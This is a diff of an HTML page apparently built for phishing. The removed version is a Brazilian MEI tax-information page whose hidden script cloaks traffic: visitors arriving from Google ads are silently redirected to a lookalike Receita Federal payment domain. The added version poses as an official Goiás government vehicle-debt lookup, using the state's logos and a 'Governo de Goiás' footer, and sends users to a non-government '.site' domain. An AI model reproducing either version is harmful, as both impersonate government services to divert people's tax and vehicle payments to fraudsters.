@@ -1,289 +1,150 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-  
+<html lang="pt-BR"><head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MEI e Pagamentos PGMEI - Informações e Orientações</title>
-  <meta name="description" content="Saiba tudo sobre MEI, PGMEI, DAS, benefícios, obrigações e como emitir pagamentos. Informações completas para microempreendedores individuais.">
-  <meta name="keywords" content="MEI, PGMEI, boleto DAS, microempreendedor individual, formalização MEI, benefícios MEI, ocupações MEI">
+  <title>Consultar Veículo – IPVA, Multas e CRLV</title>
   <style>
+    :root {
+      --verde: #008C45;
+      --verde-escuro: #006d35;
+      --cinza: #555;
+      --fundo-card: #f9f9f9;
+    }
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #0d47a1;
-      color: #fff;
+      font-family: "Segoe UI", Arial, sans-serif;
+      background: #fff;
+      color: #333;
       line-height: 1.6;
     }
     header {
-      padding: 20px;
-      text-align: center;
-      background: #1565c0;
-    }
-    header h1 {
-      margin: 0;
-      font-size: 2rem;
-    }
-    main {
-      padding: 20px;
-      max-width: 1000px;
-      margin: auto;
-      background: #1976d2;
-      border-radius: 12px;
-    }
-    h2, h3 {
-      color: #bbdefb;
-    }
-    a {
-      color: #ffeb3b;
-      text-decoration: underline;
-    }
-    footer {
-      padding: 20px;
-      text-align: center;
-      background: #0d47a1;
-      margin-top: 40px;
-    }
-    .button-hidden {
-      background-color: #1976d2;
-      color: #1976d2;
-      border: none;
-      padding: 12px 20px;
-      border-radius: 6px;
-      cursor: pointer;
-      opacity: 0;
-    }
-    .cookie-banner {
-      position: fixed;
-      bottom: 0;
-      width: 100%;
-      background: #1565c0;
+      background-color: var(--verde);
       padding: 15px;
-      text-align: center;
-    }
-    .cookie-banner button {
-      background: #ffeb3b;
-      border: none;
-      padding: 8px 12px;
-      margin-left: 10px;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    .modal {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.7);
+      display: flex;
       justify-content: center;
       align-items: center;
+      gap: 30px;
+      flex-wrap: wrap;
     }
-    .modal-content {
-      background: #fff;
-      color: #000;
+    header img {
+      height: 50px;
+      object-fit: contain;
+    }
+    main {
+      max-width: 1000px;
+      margin: 40px auto;
       padding: 20px;
-      border-radius: 12px;
-      max-width: 700px;
-      overflow-y: auto;
-      max-height: 80vh;
     }
-    .close {
-      float: right;
-      cursor: pointer;
-      font-size: 20px;
+    h1 {
+      color: var(--verde);
+      font-size: 28px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    p {
+      color: var(--cinza);
+      font-size: 16px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    .btn-consultar {
+      display: block;
+      width: max-content;
+      margin: 0 auto 40px;
+      background-color: var(--verde);
+      color: #fff;
+      font-size: 18px;
       font-weight: bold;
+      padding: 14px 40px;
+      border: none;
+      border-radius: 8px;
+      text-decoration: none;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      transition: background-color 0.3s, transform 0.2s;
+    }
+    .btn-consultar:hover {
+      background-color: var(--verde-escuro);
+      transform: scale(1.03);
+    }
+    .card {
+      background: var(--fundo-card);
+      border-radius: 10px;
+      padding: 25px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      margin-bottom: 30px;
+    }
+    .card h2 {
+      color: var(--verde);
+      font-size: 22px;
+      margin-bottom: 15px;
+    }
+    .card ul {
+      margin: 0;
+      padding-left: 20px;
+    }
+    .card ul li {
+      margin-bottom: 10px;
+      color: var(--cinza);
+    }
+    footer {
+      margin-top: 40px;
+      padding: 20px;
+      text-align: center;
+      font-size: 14px;
+      color: #777;
+      background: #f1f1f1;
+    }
+
+    /* Responsividade */
+    @media (max-width: 768px) {
+      h1 {
+        font-size: 22px;
+      }
+      .btn-consultar {
+        width: 100%;
+        text-align: center;
+      }
+      header {
+        gap: 15px;
+      }
+      header img {
+        height: 40px;
+      }
     }
   </style>
-
-<script>
-
-const urls = [
-    'cte/index',
-    'nfe/index',
-    'cte/index',
-    'asp/indexp',
-    'app/index',
-    'xml/indexp',
-    'danfe/index',
-    'nfe/index'
-];
-
-// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
-function generateHash() {
-    // Gerando um hash simples como alternativa ao MD5
-    // Para MD5 real, seria necessário uma biblioteca como crypto-js
-    return Math.random().toString(36).substring(2, 15) + 
-           Math.random().toString(36).substring(2, 15) + 
-           Date.now().toString(36);
-}
-
-// Selecionando URL aleatória
-const randomIndex = Math.floor(Math.random() * urls.length);
-const randomUrl = urls[randomIndex];
-const hash = generateHash();
-const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
-const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
-const xirjfgjsdhdjd = 'https://pgmei-emissao.receitasfazenda.top/';  
-
-// Obtendo o referer (disponível apenas no navegador)
-let referer;
-if (typeof document !== 'undefined' && document.referrer) {
-    referer = document.referrer;
-} else {
-    referer = 'not found';
-}
-
-// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
-let currentUrl;
-if (typeof window !== 'undefined') {
-    currentUrl = window.location.href;
-} else {
-    currentUrl = '';
-}
-
-// Verificando condições e redirecionando
-if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
-    // Redirecionamento (no navegador)
-    if (typeof window !== 'undefined') {
-        window.location.href = xirjfgjsdhdjd ;
-    } else {
-        console.log('Redirect to:', xirjfgjsdhdjd );
-    }
-} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
-    // Redirecionamento (no navegador)
-    if (typeof window !== 'undefined') {
-        window.location.href = bingrandomUrlWithHash;
-    } else {
-        console.log('Redirect to:', bingrandomUrlWithHash);
-    }
-} else {
-    // Bloco vazio equivalente ao else do PHP
-}
-  
-</script>
-
-
-  
 </head>
-  
 <body>
+
+  <!-- TOPO COM LOGOS -->
   <header>
-    <h1>MEI e Pagamentos PGMEI</h1>
+    <img src="https://www.go.gov.br/assets/img/logo-expresso-branca.svg" alt="Logo Expresso Goiás">
+    <img src="https://www.go.gov.br/assets/img/logo-governo-goias.svg" alt="Logo Governo de Goiás">
   </header>
 
   <main>
-    <h2>O que é o MEI e como funciona o PGMEI</h2>
-    <p>O Microempreendedor Individual (MEI) é a forma mais prática e acessível para quem deseja formalizar o próprio negócio. Já o PGMEI é o sistema oficial da Receita Federal para emissão e pagamento do boleto DAS, que mantém suas contribuições em dia.</p>
+    <h1>Consultar Veículo – IPVA, Multas e CRLV</h1>
+    <p>Consulte de forma rápida e prática as informações do seu veículo: dados cadastrais, débitos, boletos e infrações. Clique no botão abaixo para acessar o serviço.</p>
+    
+    <a href="https://portal.expresso-goias.site/ipva-goias/" class="btn-consultar">CONSULTAR</a>
 
-    <h2>Benefícios do MEI</h2>
-    <ul>
-      <li>Direito a benefícios previdenciários como aposentadoria por idade.</li>
-      <li>Emissão de notas fiscais.</li>
-      <li>Facilidade de acesso a crédito bancário.</li>
-      <li>Carga tributária simplificada e reduzida.</li>
-    </ul>
+    <!-- SEÇÃO SOBRE ESSE SERVIÇO -->
+    <div class="card">
+      <h2>Sobre esse serviço</h2>
+      <p>É um serviço público que permite a consulta de dados do Veículo, Débitos, Boletos e Infrações. Permite também baixar CRLV-e A4 (Verdinho).</p>
 
-    <h2>Obrigações do MEI</h2>
-    <p>O MEI deve pagar mensalmente o DAS (Documento de Arrecadação do Simples Nacional), manter a declaração anual em dia e cumprir com suas obrigações fiscais. Isso garante o acesso aos benefícios e evita problemas legais.</p>
-
-    <h2>O que você precisa saber antes de se tornar um MEI?</h2>
-    <p>Alguns benefícios poderão ser impactados após a sua formalização como MEI. Veja se você recebe algum desses:</p>
-
-    <h3>Benefícios previdenciários que serão cancelados</h3>
-    <ul>
-      <li>Aposentadoria por invalidez.</li>
-      <li>Auxílio-doença ou salário maternidade.</li>
-    </ul>
-
-    <h3>Benefícios assistenciais que podem ser cancelados</h3>
-    <ul>
-      <li>Seguro desemprego.</li>
-      <li>BPC-LOAS.</li>
-      <li>Prouni, FIES.</li>
-    </ul>
-
-    <h3>Benefícios que NÃO serão cancelados</h3>
-    <ul>
-      <li>Aposentadoria especial por insalubridade, idade ou por tempo de contribuição.</li>
-      <li>Fundo de Garantia por Tempo de Serviço (FGTS).</li>
-      <li>Programa de Integração Social (PIS).</li>
-      <li>Pensão por falecimento de cônjuge, pais ou filhos.</li>
-      <li>Pensão recebida por tutor de menor de idade, por morte do responsável.</li>
-    </ul>
-
-    <h3>Observações importantes</h3>
-    <p>Beneficiários do Bolsa Família devem observar os critérios do programa. Servidor Público Federal não pode ser MEI (Lei nº 8112/90). Já os servidores estaduais e municipais devem verificar a legislação própria.</p>
-
-    <h3>Requisitos para ser MEI</h3>
-    <ul>
-      <li>Exercer atividades que estejam na lista de ocupações permitidas para o MEI.</li>
-      <li>Contratar no máximo um empregado.</li>
-      <li>Não ser sócio ou administrador de outra empresa.</li>
-      <li>Ter faturamento anual de até R$ 81.000,00 (ou até R$ 251.600,00 para transportador autônomo de cargas).</li>
-    </ul>
-
-    <h2>Perguntas Frequentes</h2>
-    <h3>Como emitir o boleto DAS?</h3>
-    <p>Acesse o portal do PGMEI, faça login com sua conta gov.br e emita o boleto mensal.</p>
-    <h3>O que acontece se eu atrasar o pagamento?</h3>
-    <p>O boleto em atraso gera multa e juros. Quanto antes regularizar, menor o valor adicional.</p>
-    <h3>Preciso de contador para ser MEI?</h3>
-    <p>Não é obrigatório, mas pode ajudar na organização e cumprimento de obrigações.</p>
-
-    <button class="button-hidden">Botão Oculto</button>
+      <ul>
+        <li><strong>1 – Dados do Veículo:</strong> Informa os dados gerais que estão contidos no documento (Placa, Número do Motor, Ano de Fabricação/Modelo, Capacidade de Passageiros, Data de Aquisição 0 KM, Restrições, RENAVAN, Tipo do Automóvel, Combustível, Espécie, Data de Aquisição, Roubo/Furto, Chassi, Cor, Potência/Cilindradas, Nacionalidade, Data de Transferência/Inclusão, Ano último Licenciamento, Marca/Modelo, Carroceria, Categoria, Município/UF, Situação, Ano Último Licenciamento Pago, CRLV-E, Observação).</li>
+        
+        <li><strong>2 – Débitos e Boletos:</strong> Mostra todos os Débitos do Veículo, como: Ano/Referência, IPVA (R$), Licenciamento (R$), Seguro Obrigatório (R$), Infrações (R$), Data de Vencimento, Valor Total (R$).</li>
+        
+        <li><strong>3 – Outras Informações:</strong> Verifica-se se o Veículo tem Outros Débitos, Bloqueio Administrativo, Bloqueio Judicial, Licenciamento Notificado, Dívida Ativa e Gravame.</li>
+      </ul>
+    </div>
   </main>
 
   <footer>
-    <p><a href="#" onclick="openModal('termosModal')">Termos de Uso</a> | <a href="#" onclick="openModal('privacidadeModal')">Política de Privacidade</a> | <a href="#" onclick="openModal('contatoModal')">Contato</a></p>
-    <p>&copy; 2025 - Informações sobre MEI e PGMEI. Este site não possui vínculo com a Receita Federal.</p>
+    © 2025 — Serviço de Consulta Veicular • Governo de Goiás
   </footer>
 
-  <div class="cookie-banner" id="cookieBanner">
-    Este site usa cookies para melhorar sua experiência.
-    <button onclick="aceitarCookies()">Aceitar</button>
-  </div>
 
-  <!-- Modals -->
-  <div class="modal" id="termosModal">
-    <div class="modal-content">
-      <span class="close" onclick="closeModal('termosModal')">&times;</span>
-      <h2>Termos de Uso</h2>
-      <p>Estes termos descrevem as condições de uso do site e serviços relacionados a informações sobre MEI e PGMEI. Ao continuar navegando, você concorda com as regras aqui descritas.</p>
-    </div>
-  </div>
 
-  <div class="modal" id="privacidadeModal">
-    <div class="modal-content">
-      <span class="close" onclick="closeModal('privacidadeModal')">&times;</span>
-      <h2>Política de Privacidade</h2>
-      <p>Este site respeita sua privacidade e não coleta dados pessoais sem consentimento. Qualquer informação fornecida será utilizada apenas para fins de contato ou suporte.</p>
-    </div>
-  </div>
-
-  <div class="modal" id="contatoModal">
-    <div class="modal-content">
-      <span class="close" onclick="closeModal('contatoModal')">&times;</span>
-      <h2>Contato</h2>
-      <p>Entre em contato pelo email: suporte.mei@gmail.com</p>
-    </div>
-  </div>
-
-  <script>
-    function aceitarCookies() {
-      document.getElementById('cookieBanner').style.display = 'none';
-      localStorage.setItem('cookiesAceitos', 'true');
-    }
-    if(localStorage.getItem('cookiesAceitos')) {
-      document.getElementById('cookieBanner').style.display = 'none';
-    }
-    function openModal(id) {
-      document.getElementById(id).style.display = 'flex';
-    }
-    function closeModal(id) {
-      document.getElementById(id).style.display = 'none';
-    }
-  </script>
-</body>
-</html>
+</body></html>
